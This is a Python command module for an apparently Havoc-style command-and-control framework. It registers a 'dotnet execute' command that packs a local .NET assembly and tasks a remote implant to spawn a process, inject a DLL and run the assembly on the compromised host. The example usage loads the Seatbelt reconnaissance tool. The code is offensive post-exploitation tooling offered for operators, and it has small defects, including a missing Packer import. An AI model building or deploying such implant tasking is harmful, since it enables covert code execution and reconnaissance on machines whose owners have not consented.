
from vaelix_host import Agent, RegisterCommand

def InvokeAssembly( agentID, *param ):
    TaskID   : str    = None
    agent    : Agent  = None
    Assembly : str    = None
    packer   = Packer()

    agent  = Agent( agentID )

    if agent.ProcessArch == 'x86':
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "x86 is not supported" )
        return False

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, "Tasked agent spawn and inject an assembly executable" )
    
    if len( param ) < 2:
        agent.ConsoleWrite(agent.CONSOLE_ERROR, "Not enough arguments")
        return

    try:
        Assembly = open( param[ 0 ], 'rb' )

        packer.addstr( "DefaultAppDomain" )
        packer.addstr( "v4.0.30319" )
        packer.addstr( str(Assembly.read()) )
        packer.addstr( " " + ''.join( param[ 1: ] ) )

    except OSError:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "Failed to open assembly file: " + param[ 0 ] )
        return

    arg = packer.getbuffer() 

    agent.DllSpawn( TaskID, f"bin/InvokeAssembly.{agent.ProcessArch}.dll", arg )

    return TaskID

RegisterCommand( InvokeAssembly, "dotnet", "execute", "executes a dotnet assembly in a seperate process", 0, "[/path/to/assembl.exe] (args)", "/tmp/Seatbelt.exe -group=user" )
